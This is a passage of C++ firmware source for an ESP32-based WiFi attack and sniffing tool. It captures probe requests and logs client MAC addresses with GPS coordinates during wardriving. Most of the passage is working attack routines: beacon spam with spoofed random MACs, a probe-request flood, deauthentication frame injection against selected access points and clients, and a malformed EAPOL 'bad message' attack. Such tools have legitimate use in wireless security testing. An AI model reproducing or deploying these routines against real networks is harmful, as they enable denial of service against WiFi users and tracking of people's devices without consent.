      Serial.print(snifferPacket->rx_ctrl.rssi);
      Serial.print(" Ch: ");
      Serial.print(snifferPacket->rx_ctrl.channel);
      Serial.print(" BSSID: ");
      char addr[] = "00:00:00:00:00:00";
      char dst_addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      getMAC(dst_addr, snifferPacket->payload, 4);
      Serial.print(addr);
      Serial.print(" -> ");
      Serial.print(dst_addr);
      display_string.concat(text_table4[0]);
      display_string.concat(snifferPacket->rx_ctrl.rssi);

      display_string.concat(" ");
      display_string.concat(addr);

      #ifdef HAS_SCREEN
        for (int i = 0; i < 19 - snifferPacket->payload[37]; i++)
        {
          display_string.concat(" ");
        }
  
        Serial.print(" ");
  
        display_obj.display_buffer->add(display_string);
      #endif
      
      Serial.println();

      buffer_obj.append(snifferPacket, len);
    }
  }
}

void WiFiScan::probeSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {

  extern WiFiScan wifi_scan_obj;

  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;


    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0x40) && (buf == 0))
    {
      if (wifi_scan_obj.currentScanMode == WIFI_SCAN_PROBE) {
        String probe_req_essid;

        delay(random(0, 10));
        Serial.print("RSSI: ");
        Serial.print(snifferPacket->rx_ctrl.rssi);
        Serial.print(" Ch: ");
        Serial.print(snifferPacket->rx_ctrl.channel);
        Serial.print(" Client: ");
        char addr[] = "00:00:00:00:00:00";
        getMAC(addr, snifferPacket->payload, 10);
        Serial.print(addr);
        display_string.concat(addr);
        Serial.print(" Requesting: ");
        display_string.concat(" -> ");
        for (int i = 0; i < snifferPacket->payload[25]; i++)
        {
          Serial.print((char)snifferPacket->payload[26 + i]);
          probe_req_essid.concat((char)snifferPacket->payload[26 + i]);
        }

        display_string.concat(probe_req_essid);

        if (probe_req_essid.length() > 0) {
            bool essidExist = false;
            for (int i = 0; i < probe_req_ssids->size(); i++) {
                ProbeReqSsid cur_probe_ssid = probe_req_ssids->get(i);
                if (cur_probe_ssid.essid == probe_req_essid) {
                    cur_probe_ssid.requests++;
	      	    probe_req_ssids->set(i, cur_probe_ssid);
                    essidExist = true;
                    break;
                }
            }
            if (!essidExist) {
				      ProbeReqSsid probeReqSsid;
				      probeReqSsid.essid = probe_req_essid;
              probeReqSsid.requests = 1;
				      probeReqSsid.selected = false;
              probe_req_ssids->add(probeReqSsid);
            }
        }
        // Print spaces because of the rotating lines of the hardware scroll.
        // The same characters print from previous lines so I just overwrite them
        // with spaces.
        #ifdef HAS_SCREEN
          for (int i = 0; i < 19 - snifferPacket->payload[25]; i++)
          {
            display_string.concat(" ");
          }
    
          display_obj.display_buffer->add(display_string);
        #endif
        
        Serial.println();    

        buffer_obj.append(snifferPacket, len);
      }
      else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_STATION_WAR_DRIVE) {
        #ifdef HAS_GPS
          if (gps_obj.getGpsModuleStatus()) {
            bool do_save = false;  

            // Check if we've already seen this AP
            char addr[] = "00:00:00:00:00:00";
            getMAC(addr, snifferPacket->payload, 10);
            if (wifi_scan_obj.seen_mac(reinterpret_cast<unsigned char*>(addr)))
              return;

            Serial.print("RSSI: ");
            Serial.print(snifferPacket->rx_ctrl.rssi);
            Serial.print(" Ch: ");
            Serial.print(snifferPacket->rx_ctrl.channel);

            Serial.print(" BSSID: ");
            Serial.print(addr);
            display_string.concat(addr);

            if (gps_obj.getFixStatus()) {
              do_save = true;
              display_string.concat(" | Lt: " + gps_obj.getLat());
              display_string.concat(" | Ln: " + gps_obj.getLon());
            }
            else
              display_string.concat(" | GPS: No Fix");

            int temp_len = display_string.length();

            #ifdef HAS_SCREEN
              for (int i = 0; i < 40 - temp_len; i++)
              {
                display_string.concat(" ");
              }
        
              Serial.print(" ");
        

              display_obj.display_buffer->add(display_string);
            #endif

            Serial.println();

            //wifi_scan_obj.save_mac(reinterpret_cast<unsigned char*>(addr));

            if (do_save) {
              String wardrive_line = (String)addr + "," + (String)addr + ",," + gps_obj.getDatetime() + "," + (String)snifferPacket->rx_ctrl.channel + "," + (String)snifferPacket->rx_ctrl.rssi + "," + gps_obj.getLat() + "," + gps_obj.getLon() + "," + gps_obj.getAlt() + "," + gps_obj.getAccuracy() + ",WIFI";
              Serial.println(wardrive_line);
              buffer_obj.append(wardrive_line);
            }
          }
        #endif
      }
    }
  }
}

void WiFiScan::beaconListSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";
  String essid = "";
  bool found = false;

  if (type == WIFI_PKT_MGMT)
  {
    len -= 4;
    int fctl = ntohs(frameControl->fctl);
    const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
    const WifiMgmtHdr *hdr = &ipkt->hdr;


    // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
    #ifdef HAS_SCREEN
      int buf = display_obj.display_buffer->size();
    #else
      int buf = 0;
    #endif
    if ((snifferPacket->payload[0] == 0x40) && (buf == 0))
    {

      for (uint8_t i = 0; i < snifferPacket->payload[25]; i++)
      {
        essid.concat((char)snifferPacket->payload[26 + i]);
      }

      for (int i = 0; i < ssids->size(); i++) {
        if (ssids->get(i).essid == essid) {
          Serial.println("Found a sheep");
          found = true;
          break;
        }
      }

      if (!found)
        return;
      
      delay(random(0, 10));
      Serial.print("RSSI: ");
      Serial.print(snifferPacket->rx_ctrl.rssi);
      Serial.print(" Ch: ");
      Serial.print(snifferPacket->rx_ctrl.channel);
      Serial.print(" Client: ");
      char addr[] = "00:00:00:00:00:00";
      getMAC(addr, snifferPacket->payload, 10);
      Serial.print(addr);
      display_string.concat(addr);
      Serial.print(" Requesting: ");
      display_string.concat(" -> ");

      // ESSID
      for (int i = 0; i < snifferPacket->payload[25]; i++)
      {
        Serial.print((char)snifferPacket->payload[26 + i]);
        display_string.concat((char)snifferPacket->payload[26 + i]);
      }

      // Print spaces because of the rotating lines of the hardware scroll.
      // The same characters print from previous lines so I just overwrite them
      // with spaces.
      #ifdef HAS_SCREEN
        for (int i = 0; i < 19 - snifferPacket->payload[25]; i++)
          display_string.concat(" ");
  
        display_obj.display_buffer->add(display_string);
      #endif
      
      Serial.println();    

      buffer_obj.append(snifferPacket, len);
    }
  }
}

void WiFiScan::broadcastCustomBeacon(uint32_t current_time, AccessPoint custom_ssid) {
  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  //if (custom_ssid.beacon->size() == 0)
  //  return;


  // Randomize SRC MAC
  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  char ESSID[custom_ssid.essid.length() + 1] = {};
  custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);

  int realLen = strlen(ESSID);
  int ssidLen = random(realLen, 33);
  int numSpace = ssidLen - realLen;
  //int rand_len = sizeof(rand_reg);
  int fullLen = ssidLen;
  packet[37] = fullLen;

  // Insert my tag
  for(int i = 0; i < realLen; i++)
    packet[38 + i] = ESSID[i];

  for(int i = 0; i < numSpace; i++)
    packet[38 + realLen + i] = 0x20;

  /////////////////////////////
  
  packet[50 + fullLen] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  //for(int i = 0; i < 12; i++) 
  //  packet[38 + fullLen + i] = postSSID[i];

  //packet[34] = custom_ssid.beacon->get(0);
  //packet[35] = custom_ssid.beacon->get(1);
  packet[34] = custom_ssid.beacon[0];
  packet[35] = custom_ssid.beacon[1];
  

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  packets_sent = packets_sent + 3;
}

void WiFiScan::broadcastCustomBeacon(uint32_t current_time, ssid custom_ssid) {
  set_channel = custom_ssid.channel;
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = custom_ssid.bssid[0];
  packet[11] = packet[17] = custom_ssid.bssid[1];
  packet[12] = packet[18] = custom_ssid.bssid[2];
  packet[13] = packet[19] = custom_ssid.bssid[3];
  packet[14] = packet[20] = custom_ssid.bssid[4];
  packet[15] = packet[21] = custom_ssid.bssid[5];

  char ESSID[custom_ssid.essid.length() + 1] = {};
  custom_ssid.essid.toCharArray(ESSID, custom_ssid.essid.length() + 1);

  int ssidLen = strlen(ESSID);
  //int rand_len = sizeof(rand_reg);
  int fullLen = ssidLen;
  packet[37] = fullLen;

  // Insert my tag
  for(int i = 0; i < ssidLen; i++)
    packet[38 + i] = ESSID[i];

  /////////////////////////////
  
  packet[50 + fullLen] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  for(int i = 0; i < 12; i++) 
    packet[38 + fullLen + i] = postSSID[i];
  

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  packets_sent = packets_sent + 3;
}

// Function to send beacons with random ESSID length
void WiFiScan::broadcastSetSSID(uint32_t current_time, const char* ESSID) {
  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  int ssidLen = strlen(ESSID);
  //int rand_len = sizeof(rand_reg);
  int fullLen = ssidLen;
  packet[37] = fullLen;

  // Insert my tag
  for(int i = 0; i < ssidLen; i++)
    packet[38 + i] = ESSID[i];

  /////////////////////////////
  
  packet[50 + fullLen] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  for(int i = 0; i < 12; i++) 
    packet[38 + fullLen + i] = postSSID[i];
  

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);

  packets_sent = packets_sent + 3;
  
}

// Function for sending crafted beacon frames
void WiFiScan::broadcastRandomSSID(uint32_t currentTime) {

  set_channel = random(1,12); 
  esp_wifi_set_channel(set_channel, WIFI_SECOND_CHAN_NONE);
  delay(1);  

  // Randomize SRC MAC
  packet[10] = packet[16] = random(256);
  packet[11] = packet[17] = random(256);
  packet[12] = packet[18] = random(256);
  packet[13] = packet[19] = random(256);
  packet[14] = packet[20] = random(256);
  packet[15] = packet[21] = random(256);

  packet[37] = 6;
  
  
  // Randomize SSID (Fixed size 6. Lazy right?)
  packet[38] = alfa[random(65)];
  packet[39] = alfa[random(65)];
  packet[40] = alfa[random(65)];
  packet[41] = alfa[random(65)];
  packet[42] = alfa[random(65)];
  packet[43] = alfa[random(65)];
  
  packet[56] = set_channel;

  uint8_t postSSID[13] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c, //supported rate
                      0x03, 0x01, 0x04 /*DSSS (Current Channel)*/ };



  // Add everything that goes after the SSID
  for(int i = 0; i < 12; i++) 
    packet[38 + 6 + i] = postSSID[i];

  esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false);
  //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));
  //ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_AP, packet, sizeof(packet), false));

  packets_sent = packets_sent + 3;
}

// Function to send probe flood to all "active" access points
void WiFiScan::sendProbeAttack(uint32_t currentTime) {
  // Itterate through all access points in list
  for (int i = 0; i < access_points->size(); i++) {

    // Check if active
    if (access_points->get(i).selected) {
      this->set_channel = access_points->get(i).channel;
      esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
      delay(1);
      
      // Build packet
      // Randomize SRC MAC
      
      prob_req_packet[10] = random(256);
      prob_req_packet[11] = random(256);
      prob_req_packet[12] = random(256);
      prob_req_packet[13] = random(256);
      prob_req_packet[14] = random(256);
      prob_req_packet[15] = random(256);

      // Set SSID length
      int ssidLen = access_points->get(i).essid.length();
      int fullLen = ssidLen;
      prob_req_packet[25] = fullLen;

      // Insert ESSID
      char buf[access_points->get(i).essid.length() + 1] = {};
      access_points->get(i).essid.toCharArray(buf, access_points->get(i).essid.length() + 1);
      
      for(int i = 0; i < ssidLen; i++)
        prob_req_packet[26 + i] = buf[i];

      uint8_t postSSID[40] = {0x00, 0x00, 0x01, 0x08, 0x8c, 0x12, 
                              0x18, 0x24, 0x30, 0x48, 0x60, 0x6c, 
                              0x2d, 0x1a, 0xad, 0x01, 0x17, 0xff, 
                              0xff, 0x00, 0x00, 0x7e, 0x00, 0x00, 
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 
                              0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
                              0x00, 0x00, 0x00, 0x00};

      uint8_t good_probe_req_packet[26 + fullLen + 40] = {};
      
      for (int i = 0; i < 26 + fullLen; i++)
        good_probe_req_packet[i] = prob_req_packet[i];

      for(int i = 0; i < 40; i++) 
        good_probe_req_packet[26 + fullLen + i] = postSSID[i];

      

      // Send packet
      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);
      esp_wifi_80211_tx(WIFI_IF_AP, good_probe_req_packet, sizeof(good_probe_req_packet), false);

      packets_sent = packets_sent + 3;
    }
  }
}

void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, uint8_t mac[6]) {
  WiFiScan::set_channel = channel;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  
  // Build AP source packet
  deauth_frame_default[4] = mac[0];
  deauth_frame_default[5] = mac[1];
  deauth_frame_default[6] = mac[2];
  deauth_frame_default[7] = mac[3];
  deauth_frame_default[8] = mac[4];
  deauth_frame_default[9] = mac[5];
  
  deauth_frame_default[10] = bssid[0];
  deauth_frame_default[11] = bssid[1];
  deauth_frame_default[12] = bssid[2];
  deauth_frame_default[13] = bssid[3];
  deauth_frame_default[14] = bssid[4];
  deauth_frame_default[15] = bssid[5];

  deauth_frame_default[16] = bssid[0];
  deauth_frame_default[17] = bssid[1];
  deauth_frame_default[18] = bssid[2];
  deauth_frame_default[19] = bssid[3];
  deauth_frame_default[20] = bssid[4];
  deauth_frame_default[21] = bssid[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

  packets_sent = packets_sent + 3;

  // Build AP dest packet
  deauth_frame_default[4] = bssid[0];
  deauth_frame_default[5] = bssid[1];
  deauth_frame_default[6] = bssid[2];
  deauth_frame_default[7] = bssid[3];
  deauth_frame_default[8] = bssid[4];
  deauth_frame_default[9] = bssid[5];
  
  deauth_frame_default[10] = mac[0];
  deauth_frame_default[11] = mac[1];
  deauth_frame_default[12] = mac[2];
  deauth_frame_default[13] = mac[3];
  deauth_frame_default[14] = mac[4];
  deauth_frame_default[15] = mac[5];

  deauth_frame_default[16] = mac[0];
  deauth_frame_default[17] = mac[1];
  deauth_frame_default[18] = mac[2];
  deauth_frame_default[19] = mac[3];
  deauth_frame_default[20] = mac[4];
  deauth_frame_default[21] = mac[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

  packets_sent = packets_sent + 3;
}

void WiFiScan::sendDeauthFrame(uint8_t bssid[6], int channel, String dst_mac_str) {
  // Itterate through all access points in list
  // Check if active
  WiFiScan::set_channel = channel;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);
  
  // Build packet

  sscanf(dst_mac_str.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
        &deauth_frame_default[4], &deauth_frame_default[5], &deauth_frame_default[6], &deauth_frame_default[7], &deauth_frame_default[8], &deauth_frame_default[9]);
  
  deauth_frame_default[10] = bssid[0];
  deauth_frame_default[11] = bssid[1];
  deauth_frame_default[12] = bssid[2];
  deauth_frame_default[13] = bssid[3];
  deauth_frame_default[14] = bssid[4];
  deauth_frame_default[15] = bssid[5];

  deauth_frame_default[16] = bssid[0];
  deauth_frame_default[17] = bssid[1];
  deauth_frame_default[18] = bssid[2];
  deauth_frame_default[19] = bssid[3];
  deauth_frame_default[20] = bssid[4];
  deauth_frame_default[21] = bssid[5];      

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
  esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

  packets_sent = packets_sent + 3;
}

void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, uint8_t mac[6], uint8_t sec) {
  WiFiScan::set_channel = channel;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);

  // Build packet
  eapol_packet_bad_msg1[4] = mac[0];
  eapol_packet_bad_msg1[5] = mac[1];
  eapol_packet_bad_msg1[6] = mac[2];
  eapol_packet_bad_msg1[7] = mac[3];
  eapol_packet_bad_msg1[8] = mac[4];
  eapol_packet_bad_msg1[9] = mac[5];

  eapol_packet_bad_msg1[10] = bssid[0];
  eapol_packet_bad_msg1[11] = bssid[1];
  eapol_packet_bad_msg1[12] = bssid[2];
  eapol_packet_bad_msg1[13] = bssid[3];
  eapol_packet_bad_msg1[14] = bssid[4];
  eapol_packet_bad_msg1[15] = bssid[5];

  eapol_packet_bad_msg1[16] = bssid[0];
  eapol_packet_bad_msg1[17] = bssid[1];
  eapol_packet_bad_msg1[18] = bssid[2];
  eapol_packet_bad_msg1[19] = bssid[3];
  eapol_packet_bad_msg1[20] = bssid[4];
  eapol_packet_bad_msg1[21] = bssid[5]; 

  /* Generate random Nonce */
  for (uint8_t i = 0; i < 32; i++) {
    eapol_packet_bad_msg1[49 + i] = esp_random() & 0xFF;
  }
  /* Update replay counter */
  for (uint8_t i = 0; i < 8; i++) {
    eapol_packet_bad_msg1[41 + i] = (packets_sent >> (56 - i * 8)) & 0xFF;
  }

  if(sec == WIFI_SECURITY_WPA3 || sec == WIFI_SECURITY_WPA3_ENTERPRISE || sec == WIFI_SECURITY_WAPI) {
    eapol_packet_bad_msg1[38] = 0xCB;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
    eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
    eapol_packet_bad_msg1[40] = 0x00;      // Key Length LSB   (must be 0 with GCMP)
  }
  else {
    eapol_packet_bad_msg1[38] = 0xCA;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
    eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
    eapol_packet_bad_msg1[40] = 0x10;      // Key Length LSB   (must be 0 with GCMP)
  }

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
  //esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
  //esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);

  packets_sent = packets_sent + 1;
}

void WiFiScan::sendEapolBagMsg1(uint8_t bssid[6], int channel, String dst_mac_str, uint8_t sec) {
  WiFiScan::set_channel = channel;
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  delay(1);

  // Build packet
  sscanf(dst_mac_str.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
        &eapol_packet_bad_msg1[4], &eapol_packet_bad_msg1[5], &eapol_packet_bad_msg1[6], &eapol_packet_bad_msg1[7], &eapol_packet_bad_msg1[8], &eapol_packet_bad_msg1[9]);
  
  eapol_packet_bad_msg1[10] = bssid[0];
  eapol_packet_bad_msg1[11] = bssid[1];
  eapol_packet_bad_msg1[12] = bssid[2];
  eapol_packet_bad_msg1[13] = bssid[3];
  eapol_packet_bad_msg1[14] = bssid[4];
  eapol_packet_bad_msg1[15] = bssid[5];

  eapol_packet_bad_msg1[16] = bssid[0];
  eapol_packet_bad_msg1[17] = bssid[1];
  eapol_packet_bad_msg1[18] = bssid[2];
  eapol_packet_bad_msg1[19] = bssid[3];
  eapol_packet_bad_msg1[20] = bssid[4];
  eapol_packet_bad_msg1[21] = bssid[5]; 
  
  /* Generate random Nonce */
  for (uint8_t i = 0; i < 32; i++) {
    eapol_packet_bad_msg1[49 + i] = esp_random() & 0xFF;
  }
  /* Update replay counter */
  for (uint8_t i = 0; i < 8; i++) {
    eapol_packet_bad_msg1[41 + i] = (packets_sent >> (56 - i * 8)) & 0xFF;
  }

  if(sec == WIFI_SECURITY_WPA3 || sec == WIFI_SECURITY_WPA3_ENTERPRISE || sec == WIFI_SECURITY_WAPI) {
    eapol_packet_bad_msg1[38] = 0xCB;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
    eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
    eapol_packet_bad_msg1[40] = 0x00;      // Key Length LSB   (must be 0 with GCMP)
  }
  else {
    eapol_packet_bad_msg1[38] = 0xCA;      // Key‑Info (LSB)  Install|Ack|Pairwise, ver=3
    eapol_packet_bad_msg1[39] = 0x00;      // Key Length MSB
    eapol_packet_bad_msg1[40] = 0x10;      // Key Length LSB   (must be 0 with GCMP)
  }

  // Send packet
  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);
  esp_wifi_80211_tx(WIFI_IF_AP, eapol_packet_bad_msg1, sizeof(eapol_packet_bad_msg1), false);

  packets_sent = packets_sent + 3;
}

void WiFiScan::sendBadMsgAttack(uint32_t currentTime, bool all) {
  if (!all) {
    for (int i = 0; i < access_points->size(); i++) {
      for (int x = 0; x < access_points->get(i).stations->size(); x++) {
        if (stations->get(access_points->get(i).stations->get(x)).selected) {
          //for (int s = 0; s < 20; s++) {
            this->sendEapolBagMsg1(access_points->get(i).bssid,
                                    access_points->get(i).channel,
                                    stations->get(access_points->get(i).stations->get(x)).mac,
                                    access_points->get(i).sec);
          //}
        }
      }
    }
  }
  else {
    for (int i = 0; i < access_points->size(); i++) {
      if (access_points->get(i).selected) {
        for (int x = 0; x < access_points->get(i).stations->size(); x++) {
          //for (int s = 0; s < 20; s++) {
            this->sendEapolBagMsg1(access_points->get(i).bssid,
                                    access_points->get(i).channel,
                                    stations->get(access_points->get(i).stations->get(x)).mac,
                                    access_points->get(i).sec);
          //}
        }
      }
    }
  }
}

void WiFiScan::sendDeauthAttack(uint32_t currentTime, String dst_mac_str) {
  // Itterate through all access points in list
  for (int i = 0; i < access_points->size(); i++) {

    // Check if active
    if (access_points->get(i).selected) {
      this->set_channel = access_points->get(i).channel;
      esp_wifi_set_channel(this->set_channel, WIFI_SECOND_CHAN_NONE);
      delay(1);
      
      // Build packet

      sscanf(dst_mac_str.c_str(), "%2hhx:%2hhx:%2hhx:%2hhx:%2hhx:%2hhx", 
            &deauth_frame_default[4], &deauth_frame_default[5], &deauth_frame_default[6], &deauth_frame_default[7], &deauth_frame_default[8], &deauth_frame_default[9]);
      
      deauth_frame_default[10] = access_points->get(i).bssid[0];
      deauth_frame_default[11] = access_points->get(i).bssid[1];
      deauth_frame_default[12] = access_points->get(i).bssid[2];
      deauth_frame_default[13] = access_points->get(i).bssid[3];
      deauth_frame_default[14] = access_points->get(i).bssid[4];
      deauth_frame_default[15] = access_points->get(i).bssid[5];

      deauth_frame_default[16] = access_points->get(i).bssid[0];
      deauth_frame_default[17] = access_points->get(i).bssid[1];
      deauth_frame_default[18] = access_points->get(i).bssid[2];
      deauth_frame_default[19] = access_points->get(i).bssid[3];
      deauth_frame_default[20] = access_points->get(i).bssid[4];
      deauth_frame_default[21] = access_points->get(i).bssid[5];      

      // Send packet
      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);
      esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame_default, sizeof(deauth_frame_default), false);

      packets_sent = packets_sent + 3;
    }
  }
}


void WiFiScan::wifiSnifferCallback(void* buf, wifi_promiscuous_pkt_type_t type)
{
  extern WiFiScan wifi_scan_obj;
  wifi_promiscuous_pkt_t *snifferPacket = (wifi_promiscuous_pkt_t*)buf;
  WifiMgmtHdr *frameControl = (WifiMgmtHdr*)snifferPacket->payload;
  wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)snifferPacket->rx_ctrl;
  int len = snifferPacket->rx_ctrl.sig_len;

  String display_string = "";

  #ifdef HAS_SCREEN
    int buff = display_obj.display_buffer->size();
  #else
    int buff = 0;
  #endif

  if ((wifi_scan_obj.currentScanMode != WIFI_SCAN_CHAN_ANALYZER) &&
      (wifi_scan_obj.currentScanMode != WIFI_SCAN_PACKET_RATE)) {

    if (type == WIFI_PKT_MGMT)
    {
      len -= 4;
      int fctl = ntohs(frameControl->fctl);
      const wifi_ieee80211_packet_t *ipkt = (wifi_ieee80211_packet_t *)snifferPacket->payload;
      const WifiMgmtHdr *hdr = &ipkt->hdr;

      // If we dont the buffer size is not 0, don't write or else we get CORRUPT_HEAP
      #ifdef HAS_SCREEN
        #ifdef HAS_ILI9341
          if (snifferPacket->payload[0] == 0x80)
          {
            num_beacon++;
          }
          else if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 ))
          {
            num_deauth++;
          }
          else if (snifferPacket->payload[0] == 0x40)
          {
            num_probe++;
          }
        #else
          if (snifferPacket->payload[0] == 0x80)
            display_string.concat(";grn;");
          else if ((snifferPacket->payload[0] == 0xA0 || snifferPacket->payload[0] == 0xC0 ))
            display_string.concat(";red;");
          else if (snifferPacket->payload[0] == 0x40)
            display_string.concat(";cyn;");
          else
            display_string.concat(";mgn;");
        #endif
      #endif
    }
    else {
      #ifdef HAS_SCREEN
        #ifndef HAS_ILI9341
          display_string.concat(";wht;");
        #endif
      #endif
    }

    char src_addr[] = "00:00:00:00:00:00";
    char dst_addr[] = "00:00:00:00:00:00";
    getMAC(src_addr, snifferPacket->payload, 10);
    getMAC(dst_addr, snifferPacket->payload, 4);
    display_string.concat(src_addr);
    display_string.concat(" -> ");
    display_string.concat(dst_addr);

    int temp_len = display_string.length();

    #ifdef HAS_SCREEN
      // Fill blank space
      for (int i = 0; i < 40 - temp_len; i++)
      {
        display_string.concat(" ");
      }
    
      //Serial.print(" ");
    
      #ifdef SCREEN_BUFFER
        #ifndef HAS_ILI9341
          if (display_obj.display_buffer->size() >= 10)
            return;

          display_obj.display_buffer->add(display_string);
          Serial.println(display_string);
        #endif
      #endif
    #endif

    buffer_obj.append(snifferPacket, len);
  }
  else if (wifi_scan_obj.currentScanMode == WIFI_SCAN_CHAN_ANALYZER) {
    wifi_scan_obj._analyzer_value++;
